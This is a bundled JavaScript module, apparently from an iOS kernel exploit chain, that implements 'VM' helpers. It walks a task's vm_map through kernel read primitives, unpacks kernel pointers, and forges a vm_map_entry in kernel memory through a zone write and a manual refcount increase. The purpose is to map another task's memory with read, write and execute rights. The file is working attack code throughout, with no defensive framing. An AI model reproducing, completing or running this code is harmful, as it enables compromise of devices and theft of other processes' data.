__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ VM)
/* harmony export */ });
/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/Chain/Chain */ "./src/libs/Chain/Chain.js");
/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/Chain/Native */ "./src/libs/Chain/Native.js");
/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");
/* harmony import */ var _VmMapEntry__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! ./VmMapEntry */ "./src/libs/TaskRop/VmMapEntry.js");
/* harmony import */ var _Task__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! ./Task */ "./src/libs/TaskRop/Task.js");
/* harmony import */ var _VMObject__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(/*! ./VMObject */ "./src/libs/TaskRop/VMObject.js");
/* harmony import */ var _VMShmem__WEBPACK_IMPORTED_MODULE_6__ = __webpack_require__(/*! ./VMShmem */ "./src/libs/TaskRop/VMShmem.js");
/* harmony import */ var _VmPackingParams__WEBPACK_IMPORTED_MODULE_7__ = __webpack_require__(/*! ./VmPackingParams */ "./src/libs/TaskRop/VmPackingParams.js");









const TAG = "VM";
const VME_ALIAS_BITS = 12n;
const VME_OFFSET_BITS = (64n - VME_ALIAS_BITS);
const VME_OFFSET_SHIFT = VME_ALIAS_BITS;
const VME_SUBMAP_SHIFT = 2n;
const VME_SUBMAP_BITS = (8n * 8n - VME_SUBMAP_SHIFT);
const VM_KERNEL_POINTER_SIGNIFICANT_BITS = 38;
const VM_MAX_KERNEL_ADDRESS = 0xfffffffbffffffffn;
const VM_PAGE_PACKED_PTR_BITS = 31;
const VM_PAGE_PACKED_PTR_SHIFT = 6;
const SIZE_VMOBJECT = 0x20;
const VM_LINK_SIZE = 0x20;
const VM_MAP_ENTRY_SIZE = 0x50;
const VMShmem_SIZE = 0x18;
const VMPackingSize = 0x10;
const VM_FLAGS_ANYWHERE = 0x00000001n;

class VM
{
	static VM_PROT_READ = 1n;
	static VM_PROT_WRITE = 2n;
	static VM_PROT_EXECUTE = 4n;
	static VM_PROT_ALL = (this.VM_PROT_READ|this.VM_PROT_WRITE|this.VM_PROT_EXECUTE);
	static VM_PROT_IS_MASK = 0x40n;
	static VM_INHERIT_NONE = 2n;

	static #Tib(x)
	{
		return ((0n + (x)) << 40n);
	}
	static #Gib(x)
	{
		return ((0n + (x)) << 30n);
	}
	static #VM_MIN_KERNEL_ADDRESS()
	{
		return ((0n - this.#Gib(144n)));
	}
	static #VM_MIN_KERNEL_AND_KEXT_ADDRESS()
	{
		return this.#VM_MIN_KERNEL_ADDRESS();
	}
	static #VM_PAGE_PACKED_PTR_BASE()
	{
		return this.#VM_MIN_KERNEL_AND_KEXT_ADDRESS();
	}
	static #VM_PACKING_IS_BASE_RELATIVE(packed)
	{
		return ((packed.vmpp_bits + packed.vmpp_shift) <= VM_KERNEL_POINTER_SIGNIFICANT_BITS);
	}
	static #VM_PACKING_PARAMS(ns)
	{
		ns.vmpp_base_relative = this.#VM_PACKING_IS_BASE_RELATIVE(ns);
		return ns;
	}
	static #VM_UNPACK_POINTER(packed, ns)
	{
		return this.#vm_unpack_pointer(packed,this.#VM_PACKING_PARAMS(ns));
	}
	static #VM_PACK_POINTER(ptr, ns)
	{
		return this.#vm_pack_pointer(ptr, this.#VM_PACKING_PARAMS(ns));
	}
	static #bigUint64ToIntptr(bigUint64) {
		// Create a BigInt mask for the lower 64 bits
		const lower64BitsMask = BigInt("0xFFFFFFFFFFFFFFFF");

		// Apply the mask to ensure the value is within the range of 64 bits
		bigUint64 = bigUint64 & lower64BitsMask;

		// Check if the value is greater than the maximum signed 64-bit integer
		if (bigUint64 > BigInt("0x7FFFFFFFFFFFFFFF")) {
			// Convert to signed by subtracting 2^64
			return Number(bigUint64 - BigInt("0x10000000000000000"));
		} else {
			// Directly convert to Number
			return Number(bigUint64);
		}
	}
	static #vm_unpack_pointer(packed, params)
	{
		if (!params.vmpp_base_relative)
		{
			//console.log(TAG,`In first if unpack`);
			//let addr = this.#bigUint64ToIntptr(BigInt(packed));
			let addr = packed;
			addr <<= 64 - params.vmpp_bits;
			addr >>= 64 - params.vmpp_bits - params.vmpp_shift;
			return addr;
		}
		if (packed)
		{
			//console.log(TAG,`In second if unpack`);
			return (BigInt(packed) << BigInt(params.vmpp_shift)) + BigInt(params.vmpp_base);
		}
		return 0n;
	}
	static #vm_pack_pointer(ptr,params)
	{
		if (!params.vmpp_base_relative)
		{
			//console.log(TAG,`In first if pack`);
			return ptr >> params.vmpp_shift;
		}
		if (ptr)
		{
			//console.log(TAG,`In second if pack`);
			return (BigInt(ptr) - BigInt(params.vmpp_base)) >> BigInt(params.vmpp_shift);
		}
		return 0n;
	}
	static #VME_OFFSET(entry)
	{
		return entry.vme_offset << 12n;
	}
	static #trunc_page_kernel(x)
	{
		//return ((x) & (~vm_kernel_page_mask));
		return ((x) & (~libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].PAGE_MASK));
	}
	static #round_page_kernel(x)
	{
		//return this.#trunc_page_kernel((x) + vm_kernel_page_mask);
		return this.#trunc_page_kernel((x) + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].PAGE_MASK);
	}
	static #vm_getEntry(map,address)
	{
		let rbhRoot = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(map + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().hdrRBHRoot);

		//console.log(TAG,`Get entry:${Utils.hex(address)}`);
		//console.log(TAG,`rbh root:${Utils.hex(rbhRoot)}`);

		let rbEntry = rbhRoot;
		let foundEntry = 0n;

		while (rbEntry != 0n)
		{
			let curPtr = rbEntry - 0x20n; // container_of(rb_entry, struct vm_map_entry, store)
			//uint64_t prev = 0;

			let links = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
			libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read(curPtr, links, VM_LINK_SIZE);
			let linksBuffer = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(links,VM_LINK_SIZE);
			let linksArray = new Uint8Array(linksBuffer);
			links = new _VmMapEntry__WEBPACK_IMPORTED_MODULE_3__.vm_map_links(linksArray);

			//console.log(TAG,`[${Utils.hex(links.start)} - ${Utils.hex(links.end)}]:${Utils.hex(curPtr)}`);

			if (address >= links.start)
			{
				if (address < links.end)
				{
					foundEntry = curPtr;
					//console.log(TAG,`Found:${Utils.hex(curPtr)}`);
					break;
				}

				let rbeRight = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(rbEntry +  libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().rbeRight);
				rbEntry = rbeRight;
				//prev = curPtr;
			}
			else
			{
				let rbeLeft = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(rbEntry +  libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().rbeLeft);
				rbEntry = rbeLeft;
			}
		}
		return foundEntry;
	}

	static mapRemotePage(vmMap, address)
	{
		//console.log(TAG, `Map remote address: ${Utils.hex(address)}`);

		let vmObject = VM.getObject(vmMap, address);
		//LOG("vmObject: %llx (objectOffset=%llx, entryOffset=%llx)",
		//	vmObject.address,
		//	vmObject.objectOffset,
		//	vmObject.entryOffset);

		if (!vmObject.address)
			return null;

		let shmem = VM.createShmemWithVmObject(vmObject);
		//LOG("shmem: port=%x, address=%llx", shmem.port, shmem.remoteAddress);

		return shmem;
	}

	static getObject(map, address)
	{
		let VMObjectBuff = new ArrayBuffer(SIZE_VMOBJECT);
		let vmObject = new _VMObject__WEBPACK_IMPORTED_MODULE_5__["default"](VMObjectBuff);
		let entryAddr = this.#vm_getEntry(map, address);
		if (!entryAddr)
			return vmObject;

		let entryBuff = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].readBuff(entryAddr, VM_MAP_ENTRY_SIZE);
		let entryUintArr = new Uint8Array(entryBuff);
		let entry = new _VmMapEntry__WEBPACK_IMPORTED_MODULE_3__.vm_map_entry(entryUintArr);
		//console.log(TAG, `entry: addr=${Utils.hex(entryAddr)}, is_sub_map=${entry.is_sub_map}, vme_object_packed=${Utils.hex(entry.vme_object)}`);

		let paramsBuff = new ArrayBuffer(VMPackingSize);
		let params = new _VmPackingParams__WEBPACK_IMPORTED_MODULE_7__["default"](paramsBuff);
		params.vmpp_base = this.#VM_PAGE_PACKED_PTR_BASE();
		params.vmpp_bits = VM_PAGE_PACKED_PTR_BITS;
		params.vmpp_shift = VM_PAGE_PACKED_PTR_SHIFT;
		params.vmpp_base_relative = this.#VM_PACKING_IS_BASE_RELATIVE(params);
		let vmeObject = this.#VM_UNPACK_POINTER(entry.vme_object, params);
		//console.log(TAG, `vme object: ${Utils.hex(vmeObject)}`);

		let objectOffs = this.#VME_OFFSET(entry);
		let entryOffs = address - entry.links.start + objectOffs;

		//console.log(TAG, `object offset: ${Utils.hex(objectOffs)}`);
		//console.log(TAG, `entry offset: ${Utils.hex(entryOffs)}`);

		vmObject.vmAddress = address;
		vmObject.address = BigInt(vmeObject);
		vmObject.objectOffset = BigInt(objectOffs);
		vmObject.entryOffset = BigInt(entryOffs);
		return vmObject;
	}

	static createShmemWithVmObject(object)
	{
		//console.log(TAG,`Inside createShmem with addr to read:${Utils.hex(object.address)}`);
		let shmemBuff = new ArrayBuffer(VMShmem_SIZE);
		let shmem = new _VMShmem__WEBPACK_IMPORTED_MODULE_6__["default"](shmemBuff);
		let size = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(object.address + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().vouSize);
		size = _Task__WEBPACK_IMPORTED_MODULE_4__["default"].round_page(size);

		//console.log(TAG,`vm object size:${Utils.hex(size)}`);

		let localAddr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
		let roundedSize = this.#round_page_kernel(size);
		let ret = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_vm_allocate",0x203n, localAddr, roundedSize, VM_FLAGS_ANYWHERE);
		if (ret != 0)
		{
			console.log(TAG,`mach_vm_allocate():${ret}`);
			return shmem;
		}
		localAddr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read64(localAddr);
		//console.log(TAG,`mach_vm_allocate:${Utils.hex(roundedSize)} localAddr:${Utils.hex(localAddr)}`);
		/*
		let memory_object = new_bigint();
		ret = Native.callSymbol("mach_make_memory_entry_64",
			0x203n,
			get_bigint_addr(roundedSize),
			localAddr,
			this.VM_PROT_READ | this.VM_PROT_WRITE,
			get_bigint_addr(memory_object),
			0n);
		let resBuff = Native.read(get_bigint_addr(memory_object),Utils.UINT32_SIZE);
		let resView = new DataView(resBuff);
		let port = resView.getUint32(0,true);
		*/

		let memory_object = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem + 0x500n;
		let roundedSizePtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem + 0x1000n;
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].write64(roundedSizePtr, roundedSize);

		ret = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_make_memory_entry_64",
			0x203n,
			roundedSizePtr,
			localAddr,
			this.VM_PROT_READ | this.VM_PROT_WRITE,
			memory_object,
			0n);
		let port = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read32(memory_object);
		//let port = Native.callSymbol("wrapper_mach_make_memory_entry_64",roundedSize,localAddr);
		//console.log(TAG,`mach_make_memory_entry_64():${Utils.hex(port)}`);
		let shmemNamedEntry = _Task__WEBPACK_IMPORTED_MODULE_4__["default"].getPortKObject(BigInt(port));
		//console.log(TAG,`shmem named entry:${Utils.hex(shmemNamedEntry)}`);
		let shmemVMCopyAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(shmemNamedEntry + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().backingCopy);
		//console.log(TAG,`shmem named entry VM copy addr:${Utils.hex(shmemVMCopyAddr)}`);
		let nextAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(shmemVMCopyAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().next);
		//console.log(TAG,`next addr:${Utils.hex(nextAddr)}`);
		let entryBuff = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].readBuff(nextAddr, VM_MAP_ENTRY_SIZE);
		let entryArr = new Uint8Array(entryBuff);
		let entry = new _VmMapEntry__WEBPACK_IMPORTED_MODULE_3__.vm_map_entry(entryArr);
		//console.log(TAG,`entry: vme_kernel_object=${Utils.hex(entry.vme_kernel_object)}, is_sub_map=${Utils.hex(entry.is_sub_map)}`);
		//console.log(TAG,`entry: is_sub_map=${Utils.hex(entry.is_sub_map)}`);
		if (entry.vme_kernel_object || entry.is_sub_map || false) // vme_kernel_object struct is not implemented
		{
			console.log(TAG,`Entry cannot be a submap`);
			return shmem;
		}
		let paramsBuff = new ArrayBuffer(VMPackingSize);
		let params = new _VmPackingParams__WEBPACK_IMPORTED_MODULE_7__["default"](paramsBuff);
		params.vmpp_base = this.#VM_PAGE_PACKED_PTR_BASE();
		params.vmpp_bits = VM_PAGE_PACKED_PTR_BITS;
		params.vmpp_shift = VM_PAGE_PACKED_PTR_SHIFT;
		params.vmpp_base_relative = this.#VM_PACKING_IS_BASE_RELATIVE(params);
		let packedPointer = this.#VM_PACK_POINTER(object.address, params);
		//console.log(TAG,`packedPointer:${Utils.hex(packedPointer)}`);
		let refCount = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read32(object.address + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().refCount);
		//console.log(TAG,`vm object ref count:${Utils.hex(refCount)}`);
		refCount++;
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write32(object.address + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().refCount, refCount);
		entry.vme_object = Number(packedPointer);
		entry.vme_offset = object.objectOffset;
		//write(nextAddr, &entry, sizeof(entry));
		// write dedicate write in order to avoid zone panic with bigger 0x20 elements size
		let entryResWrite = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].write(entryResWrite,entryArr.buffer);
		//Utils.printArrayBufferInChunks(entryArr.buffer);
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].writeZoneElement(nextAddr, entryResWrite, VM_MAP_ENTRY_SIZE);
		//console.log(TAG,`After write zone element`);
		//let mappedAddr = Native.callSymbol("malloc",roundedSize * 4n);
		//let mappedAddr = new_bigint();
		let mappedAddr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].write64(mappedAddr, 0x1337n);
		//let mach_vm_map_func = Native.dlsym("mach_vm_map");
		//console.log(TAG,`mach_vm_map:${Utils.hex(mach_vm_map_func)} with object.entryOffset:${Utils.hex(object.entryOffset)}`);
		//ret = fcall(mach_vm_map_func,0x203n,get_bigint_addr(mappedAddr),0x4000n,0n,1n,BigInt(port),BigInt(object.entryOffset),0n,(this.VM_PROT_ALL | this.VM_PROT_IS_MASK) | ((this.VM_PROT_ALL | this.VM_PROT_IS_MASK) << 32n),this.VM_INHERIT_NONE);
		ret = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_vm_map",0x203n,mappedAddr,0x4000n,0n,1n,BigInt(port),BigInt(object.entryOffset),0n,(this.VM_PROT_ALL | this.VM_PROT_IS_MASK) | ((this.VM_PROT_ALL | this.VM_PROT_IS_MASK) << 32n),this.VM_INHERIT_NONE);
		//console.log(TAG,`ret:${ret}`);
		mappedAddr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read64(mappedAddr);
		//console.log(TAG,`mach_vm_map():${Utils.hex(ret)}, mappedAddr=${Utils.hex(mappedAddr)}`);
		if(ret != 0)
		{
			console.log(TAG,'failed on mach_vm_map');
			mappedAddr = 0n;
		}

		ret = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_vm_deallocate", 0x203, localAddr, roundedSize);
		if (ret != 0) {
			console.log(TAG, "mach_vm_deallocate: " + ret);
		}

		//let mappedAddr = Native.callSymbol("wrapper_mach_vm_map",port,object.entryOffset);
		//console.log(TAG,`mappedAddr:${Utils.hex(mappedAddr)}`);
		shmem.port = BigInt(port);
		shmem.remoteAddress = object.vmAddress;
		shmem.localAddress = mappedAddr;
		return shmem;
	}

	static mocker(addrUnpack,addrPack)
	{
		let paramsBuff = new ArrayBuffer(VMPackingSize);
		let params = new _VmPackingParams__WEBPACK_IMPORTED_MODULE_7__["default"](paramsBuff);
		params.vmpp_base = this.#VM_PAGE_PACKED_PTR_BASE();
		params.vmpp_bits = VM_PAGE_PACKED_PTR_BITS;
		params.vmpp_shift = VM_PAGE_PACKED_PTR_SHIFT;
		params.vmpp_base_relative = this.#VM_PACKING_IS_BASE_RELATIVE(params);
		let vmeObject = this.#VM_UNPACK_POINTER(addrUnpack, params);
		//console.log(TAG,`vmeObjectUnpack:${Utils.hex(vmeObject)}`);
		vmeObject = this.#VM_PACK_POINTER(addrPack,params);
		//console.log(TAG,`vmeObjectpack:${Utils.hex(vmeObject)}`);
	}
}